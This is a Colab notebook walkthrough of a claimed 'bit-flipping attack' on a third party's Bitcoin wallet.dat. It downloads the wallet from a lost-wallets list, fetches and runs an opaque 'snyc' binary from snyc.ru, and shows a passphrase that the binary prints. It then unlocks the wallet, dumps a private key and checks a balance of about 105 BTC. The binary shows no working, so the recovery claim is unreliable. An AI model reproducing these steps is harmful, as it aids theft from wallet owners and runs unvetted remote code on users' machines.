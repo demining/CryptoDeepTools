{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "I4qu4UB0oYU7",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "7185b69b-77e3-4eea-c086-5cdf1fb6a0e0"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\r0% [Working]\r            \rHit:1 http://archive.ubuntu.com/ubuntu jammy InRelease\n",
            "\r0% [Connecting to security.ubuntu.com (91.189.91.82)] [Connected to cloud.r-pro\r                                                                               \rGet:2 http://archive.ubuntu.com/ubuntu jammy-updates InRelease [128 kB]\n",
            "Get:3 http://archive.ubuntu.com/ubuntu jammy-backports InRelease [127 kB]\n",
            "Get:4 https://cloud.r-project.org/bin/linux/ubuntu jammy-cran40/ InRelease [3,632 B]\n",
            "Get:5 http://security.ubuntu.com/ubuntu jammy-security InRelease [129 kB]\n",
            "Hit:6 https://cli.github.com/packages stable InRelease\n",
            "Get:7 https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64  InRelease [1,581 B]\n",
            "Hit:8 https://ppa.launchpadcontent.net/deadsnakes/ppa/ubuntu jammy InRelease\n",
            "Hit:9 https://ppa.launchpadcontent.net/graphics-drivers/ppa/ubuntu jammy InRelease\n",
            "Hit:10 https://ppa.launchpadcontent.net/ubuntugis/ppa/ubuntu jammy InRelease\n",
            "Get:11 https://r2u.stat.illinois.edu/ubuntu jammy InRelease [6,555 B]\n",
            "Get:12 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 Packages [3,623 kB]\n",
            "Get:13 http://archive.ubuntu.com/ubuntu jammy-updates/universe amd64 Packages [1,579 kB]\n",
            "Get:14 https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2204/x86_64  Packages [1,961 kB]\n",
            "Get:15 http://security.ubuntu.com/ubuntu jammy-security/restricted amd64 Packages [5,374 kB]\n",
            "Get:16 https://r2u.stat.illinois.edu/ubuntu jammy/main all Packages [9,238 kB]\n",
            "Get:17 http://security.ubuntu.com/ubuntu jammy-security/main amd64 Packages [3,310 kB]\n",
            "Get:18 https://r2u.stat.illinois.edu/ubuntu jammy/main amd64 Packages [2,790 kB]\n",
            "Fetched 28.3 MB in 6s (4,637 kB/s)\n",
            "Reading package lists... Done\n",
            "W: Skipping acquire of configured file 'main/source/Sources' as repository 'https://r2u.stat.illinois.edu/ubuntu jammy InRelease' does not seem to provide it (sources.list entry misspelt?)\n",
            "Reading package lists... Done\n",
            "Building dependency tree... Done\n",
            "Reading state information... Done\n",
            "software-properties-common is already the newest version (0.99.22.9).\n",
            "0 upgraded, 0 newly installed, 0 to remove and 38 not upgraded.\n"
          ]
        }
      ],
      "source": [
        "!apt-get update\n",
        "!apt-get install -y software-properties-common"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!wget https://bitcoin.org/bin/bitcoin-core-0.18.0/bitcoin-0.18.0-x86_64-linux-gnu.tar.gz\n",
        "!tar -xzf bitcoin-0.18.0-x86_64-linux-gnu.tar.gz"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "gN0bNJte1o2s",
        "outputId": "56dca57d-de43-46e0-c8be-95574c6b16a7"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "--2025-09-03 23:08:20--  https://bitcoin.org/bin/bitcoin-core-0.18.0/bitcoin-0.18.0-x86_64-linux-gnu.tar.gz\n",
            "Resolving bitcoin.org (bitcoin.org)... 188.114.96.0, 188.114.97.0, 2a06:98c1:3121::, ...\n",
            "Connecting to bitcoin.org (bitcoin.org)|188.114.96.0|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 31868090 (30M) [application/octet-stream]\n",
            "Saving to: ‘bitcoin-0.18.0-x86_64-linux-gnu.tar.gz’\n",
            "\n",
            "bitcoin-0.18.0-x86_ 100%[===================>]  30.39M  8.73MB/s    in 3.5s    \n",
            "\n",
            "2025-09-03 23:08:25 (8.73 MB/s) - ‘bitcoin-0.18.0-x86_64-linux-gnu.tar.gz’ saved [31868090/31868090]\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "cd bitcoin-0.18.0/bin/"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "cSSdR31O1uyv",
        "outputId": "17202684-a850-408e-f34c-d4abb3792b2e"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "/content/bitcoin-0.18.0/bin\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!./bitcoin-cli --version"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "aOnDjatl1zpr",
        "outputId": "e03d393f-a4de-4340-f580-43de11a6cca9"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Bitcoin Core RPC client version v0.18.0\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!wget https://github.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List/raw/refs/heads/main/105.68%20BTC/wallet.dat"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "hK5rTtgV161H",
        "outputId": "02c5573c-2faa-427b-877c-70eaeb77e392"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "--2025-09-03 23:09:34--  https://github.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List/raw/refs/heads/main/105.68%20BTC/wallet.dat\n",
            "Resolving github.com (github.com)... 140.82.121.4\n",
            "Connecting to github.com (github.com)|140.82.121.4|:443... connected.\n",
            "HTTP request sent, awaiting response... 302 Found\n",
            "Location: https://raw.githubusercontent.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List/refs/heads/main/105.68%20BTC/wallet.dat [following]\n",
            "--2025-09-03 23:09:34--  https://raw.githubusercontent.com/keyhunters/Biggest-Lost-Bitcoin-Wallets-List/refs/heads/main/105.68%20BTC/wallet.dat\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 1089536 (1.0M) [application/octet-stream]\n",
            "Saving to: ‘wallet.dat’\n",
            "\n",
            "wallet.dat          100%[===================>]   1.04M  --.-KB/s    in 0.03s   \n",
            "\n",
            "2025-09-03 23:09:35 (38.2 MB/s) - ‘wallet.dat’ saved [1089536/1089536]\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!wget https://github.com/keyhunters/bitcoin/raw/refs/heads/master/src/crypto/aes.cpp"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "4omf-iBD2A3D",
        "outputId": "6cd38881-b7e5-4f13-9147-388f396f2380"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "--2025-09-03 23:09:59--  https://github.com/keyhunters/bitcoin/raw/refs/heads/master/src/crypto/aes.cpp\n",
            "Resolving github.com (github.com)... 140.82.121.3\n",
            "Connecting to github.com (github.com)|140.82.121.3|:443... connected.\n",
            "HTTP request sent, awaiting response... 302 Found\n",
            "Location: https://raw.githubusercontent.com/keyhunters/bitcoin/refs/heads/master/src/crypto/aes.cpp [following]\n",
            "--2025-09-03 23:09:59--  https://raw.githubusercontent.com/keyhunters/bitcoin/refs/heads/master/src/crypto/aes.cpp\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 4244 (4.1K) [text/plain]\n",
            "Saving to: ‘aes.cpp’\n",
            "\n",
            "aes.cpp             100%[===================>]   4.14K  --.-KB/s    in 0s      \n",
            "\n",
            "2025-09-03 23:09:59 (37.6 MB/s) - ‘aes.cpp’ saved [4244/4244]\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!./bitcoind -daemon -wallet=/content/bitcoin-0.18.0/bin/wallet.dat"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "FBqucAcG2JRW",
        "outputId": "5b84c53e-7fdd-47e5-b212-ee75c0627a06"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Bitcoin server starting\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!wget https://snyc.ru/repositories/neuralnet_tools.zip"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "mp9X38Mk2QzR",
        "outputId": "3c8a8cf1-1668-4b5f-f873-da1b580e031d"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "--2025-09-03 23:11:03--  https://snyc.ru/repositories/neuralnet_tools.zip\n",
            "Resolving snyc.ru (snyc.ru)... 31.31.196.205, 2a00:f940:2:2:1:1:0:167\n",
            "Connecting to snyc.ru (snyc.ru)|31.31.196.205|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 6977964 (6.7M) [application/zip]\n",
            "Saving to: ‘neuralnet_tools.zip’\n",
            "\n",
            "neuralnet_tools.zip 100%[===================>]   6.65M  19.6MB/s    in 0.3s    \n",
            "\n",
            "2025-09-03 23:11:04 (19.6 MB/s) - ‘neuralnet_tools.zip’ saved [6977964/6977964]\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!unzip neuralnet_tools.zip"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "dSPZ5dg92V4H",
        "outputId": "82224579-6958-4a22-809f-a1afe29ad9ff"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Archive:  neuralnet_tools.zip\n",
            "   creating: Chainer/\n",
            "   creating: CNTK/\n",
            "   creating: DeepLearning4J/\n",
            "   creating: FastAI/\n",
            "   creating: Gensim/\n",
            "   creating: JAX/\n",
            "   creating: Keras/\n",
            "   creating: Lasagne/\n",
            "   creating: Matplotlib/\n",
            "   creating: MXNet/\n",
            "   creating: NLTK/\n",
            "   creating: NumPy/\n",
            "   creating: OpenCV/\n",
            "   creating: Pandas/\n",
            "   creating: PyTorch/\n",
            "   creating: Scikit-learn/\n",
            "   creating: SciPy/\n",
            "   creating: Seaborn/\n",
            "  inflating: snyc                    \n",
            "   creating: SpaCy/\n",
            "   creating: TensorFlow/\n",
            "   creating: Theano/\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "ls"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "rZLMzTpQ2azn",
        "outputId": "33279900-e8ab-492d-8dde-f56880437d7b"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "aes.cpp          \u001b[0m\u001b[01;34mDeepLearning4J\u001b[0m/  neuralnet_tools.zip  \u001b[01;34mSeaborn\u001b[0m/\n",
            "\u001b[01;32mbitcoin-cli\u001b[0m*     \u001b[01;34mFastAI\u001b[0m/          \u001b[01;34mNLTK\u001b[0m/                \u001b[01;32msnyc\u001b[0m*\n",
            "\u001b[01;32mbitcoind\u001b[0m*        \u001b[01;34mGensim\u001b[0m/          \u001b[01;34mNumPy\u001b[0m/               \u001b[01;34mSpaCy\u001b[0m/\n",
            "\u001b[01;32mbitcoin-qt\u001b[0m*      \u001b[01;34mJAX\u001b[0m/             \u001b[01;34mOpenCV\u001b[0m/              \u001b[01;34mTensorFlow\u001b[0m/\n",
            "\u001b[01;32mbitcoin-tx\u001b[0m*      \u001b[01;34mKeras\u001b[0m/           \u001b[01;34mPandas\u001b[0m/              \u001b[01;32mtest_bitcoin\u001b[0m*\n",
            "\u001b[01;32mbitcoin-wallet\u001b[0m*  \u001b[01;34mLasagne\u001b[0m/         \u001b[01;34mPyTorch\u001b[0m/             \u001b[01;34mTheano\u001b[0m/\n",
            "\u001b[01;34mChainer\u001b[0m/         \u001b[01;34mMatplotlib\u001b[0m/      \u001b[01;34mScikit-learn\u001b[0m/        wallet.dat\n",
            "\u001b[01;34mCNTK\u001b[0m/            \u001b[01;34mMXNet\u001b[0m/           \u001b[01;34mSciPy\u001b[0m/\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!./snyc"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "fEwk3lAJ2efL",
        "outputId": "11a2a72f-8ac1-40db-9575-a9b0104d3946"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "   _____                     ___    ____\n",
            "  / ___/____  __  _______   /   |  /  _/\n",
            "  \\__ \\/ __ \\/ / / / ___/  / /| |  / /  \n",
            " ___/ / / / / /_/ / /__   / ___ |_/ /   \n",
            "/____/_/ /_/\\__, /\\___/  /_/  |_/___/   \n",
            "           /____/                       \n",
            "\n",
            "\n",
            "Options:\n",
            "\n",
            "Running ./snyc -help displays help information for Snyc AI — a modern machine learning tool with deep analytics capabilities,\n",
            "designed for rapid recovery of lost data in cryptocurrency wallets, analysis of encrypted files, and decryption.\n",
            "\n",
            "  -help / --help         show this help message and exit (displays help on all available parameters and descriptions).\n",
            "  -ciphertext [file.dat] instructs the tool to use the file wallet.dat as the object for encrypted data analysis (ciphertext).\n",
            "  -crypto [file/code]    this command instructs to use the source code of the AES algorithm from the file aes.cpp for decryption and analysis.\n",
            "  -scan                  starts scanning a file or directory in search of keys and lost data.\n",
            "  -input [file]          specifies the input encrypted file, such as wallet.dat or similar.\n",
            "  -output [path]         path to save results or recovered data.\n",
            "  -mode [type]           selects the operating mode (e.g., manual, automatic, accelerated).\n",
            "  -verbose               detailed logging output for debugging and monitoring.\n",
            "  -threads [N]           parameter to specify the number of CPU threads for multithreaded processing.\n",
            "  -ai-model [path/name]  selects or loads a specific AI model for analysis.\n",
            "  -test                  test mode, for example, to verify correct settings without actually launching an attack.\n",
            "  -version               displays the program version for update verification.\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!./snyc -help"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "dgPy5fSq2jSL",
        "outputId": "2d28ee46-9745-4b95-cb56-64db75175dd6"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "usage: snyc [-h] [-ciphertext CIPHERTEXT] [-crypto CRYPTO]\n",
            "\n",
            "Snyc AI - a tool for cryptocurrency wallet data recovery and analysis\n",
            "\n",
            "options:\n",
            "  -h, --help            show this help message and exit\n",
            "  -ciphertext CIPHERTEXT\n",
            "                        Use file as object for encrypted data analysis\n",
            "                        (ciphertext)\n",
            "  -crypto CRYPTO        Use source code of AES algorithm from file for\n",
            "                        decryption and analysis\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!./snyc -ciphertext wallet.dat -crypto aes.cpp"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "n_Jnx3AG2qab",
        "outputId": "44018b08-a87c-4ac4-cc8b-953c9e282bb9"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "   _____                     ___    ____\n",
            "  / ___/____  __  _______   /   |  /  _/\n",
            "  \\__ \\/ __ \\/ / / / ___/  / /| |  / /  \n",
            " ___/ / / / / /_/ / /__   / ___ |_/ /   \n",
            "/____/_/ /_/\\__, /\\___/  /_/  |_/___/   \n",
            "           /____/                       \n",
            "\n",
            "walletpassphrase 1111010101011001100101101011010110001111100001101111101111010000100011100111101000100011110001010111111110010000011111011011111101011010000100110000111100010001001101000001110100001101001010001101111001110110110110100011011000001101110101101010110101010101 60\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!./bitcoin-cli walletpassphrase 1111010101011001100101101011010110001111100001101111101111010000100011100111101000100011110001010111111110010000011111011011111101011010000100110000111100010001001101000001110100001101001010001101111001110110110110100011011000001101110101101010110101010101 60\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "PHAVs5ij3zzI",
        "outputId": "d06bcfbb-5a25-431b-ead1-2ec6dd9034de"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "walletpassphrase(…)\n",
            "\n",
            "null\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!./bitcoin-cli dumpprivkey 16A5RFckRNW6fZzfjCGSneD3PApACLRwix"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "VtiwXo0235E0",
        "outputId": "fd5c2ec7-6e7b-4705-d458-adfd0e15a194"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "5KVPkHW5yrrQ7ixvB3HYXgTRh6X7TBxNNWWkdvBkWdGNMSEgCWf\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install bitcoin"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "CqD7nf0H5RKf",
        "outputId": "194a0068-74b7-4529-fc54-019c64a30523"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting bitcoin\n",
            "  Downloading bitcoin-1.1.42.tar.gz (36 kB)\n",
            "  Preparing metadata (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "Building wheels for collected packages: bitcoin\n",
            "  Building wheel for bitcoin (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for bitcoin: filename=bitcoin-1.1.42-py3-none-any.whl size=44403 sha256=ceea89011b94f20b6dab7cbbd4b960a7945488998d6ede44121ba61b125d63cf\n",
            "  Stored in directory: /root/.cache/pip/wheels/ca/58/57/229b3e0dacbfd900c21be9010d6b138ec314fe91f57e973183\n",
            "Successfully built bitcoin\n",
            "Installing collected packages: bitcoin\n",
            "Successfully installed bitcoin-1.1.42\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "from bitcoin import *\n",
        "import sys\n",
        "import re\n",
        "import json\n",
        "from time import sleep\n",
        "\n",
        "try:    # if is python3\n",
        "    from urllib.request import urlopen\n",
        "except: # if is python2\n",
        "    from urllib2 import urlopen\n",
        "\n",
        "def get_address_from_private_key(private_key_wif):\n",
        "    # decode WIF private key\n",
        "    private_key = decode_privkey(private_key_wif)\n",
        "\n",
        "    # get the public key from the private one\n",
        "    public_key = privtopub(private_key)\n",
        "\n",
        "    # get bitcoin address from public key\n",
        "    address = pubtoaddr(public_key)\n",
        "\n",
        "    return address\n",
        "\n",
        "def check_balance(address):\n",
        "\n",
        "    #Modify the value of the variable below to False if you do not want Bell Sound when the Software finds balance.\n",
        "    SONG_BELL = True\n",
        "\n",
        "    #Add time different of 0 if you need more security on the checks\n",
        "    WARN_WAIT_TIME = 0\n",
        "\n",
        "    blockchain_tags_json = [\n",
        "        'total_received',\n",
        "        ]\n",
        "\n",
        "    SATOSHIS_PER_BTC = 1e+8\n",
        "\n",
        "    check_address = address\n",
        "\n",
        "    parse_address_structure = re.match(r' *([a-zA-Z1-9]{1,34})', check_address)\n",
        "    if ( parse_address_structure is not None ):\n",
        "        check_address = parse_address_structure.group(1)\n",
        "    else:\n",
        "        #print( \"\\nThis Bitcoin Address is invalid\" + check_address )\n",
        "        exit(1)\n",
        "\n",
        "    #Read info from Blockchain about the Address\n",
        "    reading_state=1\n",
        "    while (reading_state):\n",
        "        try:\n",
        "            htmlfile = urlopen(\"https://blockchain.info/address/%s?format=json\" % check_address, timeout = 10)\n",
        "            htmltext = htmlfile.read().decode('utf-8')\n",
        "            reading_state  = 0\n",
        "        except:\n",
        "            reading_state+=1\n",
        "            print( \"Checking... \" + str(reading_state) )\n",
        "            sleep(60*reading_state)\n",
        "\n",
        "    #print( \"\\nBitcoin Address = \" + check_address )\n",
        "\n",
        "    blockchain_info_array = []\n",
        "    tag = ''\n",
        "    try:\n",
        "        for tag in blockchain_tags_json:\n",
        "            blockchain_info_array.append (\n",
        "                float( re.search( r'%s\":(\\d+),' % tag, htmltext ).group(1) ) )\n",
        "    except:\n",
        "        print( \"Error '%s'.\" % tag );\n",
        "        exit(1)\n",
        "\n",
        "    for i, btc_tokens in enumerate(blockchain_info_array):\n",
        "\n",
        "        sys.stdout.write (\"%s \\t= \" % blockchain_tags_json[i])\n",
        "        if btc_tokens > 0.0:\n",
        "            print( \"%.8f Bitcoin\" % (btc_tokens/SATOSHIS_PER_BTC) );\n",
        "        else:\n",
        "            print( \"0 Bitcoin\" );\n",
        "\n",
        "        if (SONG_BELL and blockchain_tags_json[i] == 'final_balance' and btc_tokens > 0.0):\n",
        "\n",
        "            #If you have a balance greater than 0 you will hear the bell\n",
        "            sys.stdout.write ('\\a\\a\\a')\n",
        "            sys.stdout.flush()\n",
        "\n",
        "            with open('balance.json', 'a') as arq1:\n",
        "                arq1.write(\"Bitcoin Address: %s\" % check_address)\n",
        "                arq1.write(\"\\t Balance: %.8f Bitcoin\" % (btc_tokens/SATOSHIS_PER_BTC))\n",
        "                arq1.write(\"\\n\")\n",
        "\n",
        "            if (WARN_WAIT_TIME > 0):\n",
        "                sleep(WARN_WAIT_TIME)\n",
        "\n",
        "# enter your private key in WIF format\n",
        "private_key_wif = \"5KVPkHW5yrrQ7ixvB3HYXgTRh6X7TBxNNWWkdvBkWdGNMSEgCWf\"\n",
        "\n",
        "# get bitcoin address\n",
        "bitcoin_address = get_address_from_private_key(private_key_wif)\n",
        "print (\"__________________________________________________\\n\")\n",
        "print(f\"Private Key WIF: {private_key_wif}\")\n",
        "print(f\"Bitcoin Address: {bitcoin_address}\")\n",
        "\n",
        "check_balance(bitcoin_address)\n",
        "print (\"__________________________________________________\\n\")"
      ],
      "metadata": {
        "id": "pVKC3X7S5ZXn",
        "outputId": "b1b71d03-2d90-48e9-d3e9-2ddf5ce39b86",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "__________________________________________________\n",
            "\n",
            "Private Key WIF: 5KVPkHW5yrrQ7ixvB3HYXgTRh6X7TBxNNWWkdvBkWdGNMSEgCWf\n",
            "Bitcoin Address: 16A5RFckRNW6fZzfjCGSneD3PApACLRwix\n",
            "total_received \t= 105.68557389 Bitcoin\n",
            "__________________________________________________\n",
            "\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "\n",
        "\n",
        "---\n",
        "\n",
        "\n",
        "\n",
        "\n"
      ],
      "metadata": {
        "id": "U9VQGu4EDGWe"
      }
    },
    {
      "cell_type": "code",
      "source": [],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 336
        },
        "id": "gjfKyvapDJs2",
        "outputId": "f2c75cae-e44e-4cbe-e030-a0ca3ccf6240"
      },
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<IPython.core.display.HTML object>"
            ],
            "text/html": [
              "\n",
              "<iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/watch?v=3uCsL_zxKPI\" frameborder=\"0\" allowfullscreen></iframe>\n"
            ]
          },
          "metadata": {},
          "execution_count": 1
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "---\n",
        "\n",
        "\n",
        "# Telegram: https://t.me/cryptodeeptech\n",
        "\n",
        "# YouTube: https://www.youtube.com/@cryptodeeptech\n",
        "\n",
        "# Publication: https://cryptodeeptech.ru/bit-flipping-attack-on-wallet-dat\n",
        "\n",
        "\n",
        "---"
      ],
      "metadata": {
        "id": "MmxELIdNDZst"
      }
    }
  ]
}